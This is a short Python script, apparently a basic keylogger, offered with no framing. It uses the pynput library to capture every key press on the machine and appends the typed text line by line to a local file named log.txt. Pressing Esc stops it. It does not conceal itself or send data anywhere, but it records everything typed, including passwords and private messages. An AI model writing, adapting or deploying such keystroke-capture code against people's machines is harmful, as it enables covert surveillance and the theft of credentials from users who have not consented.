from pynput.keyboard import Listener, Key

log_file = "log.txt"
buffer = [] 

def write_to_file():
    with open(log_file, "a") as file:
        file.write("".join(buffer) + "\n")  
    buffer.clear()  

def on_press(key):
    global buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)  
        elif key == Key.space:
            buffer.append(" ")  
        elif key == Key.enter:
            write_to_file()  
        elif key == Key.backspace:
            if buffer: 
                buffer.pop()  
    except Exception as e:
        print(f"[ERROR] {e}")

def on_release(key):
    if key == Key.esc:  
        write_to_file()
        print("\n[INFO] Keylogger stopped.")
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


 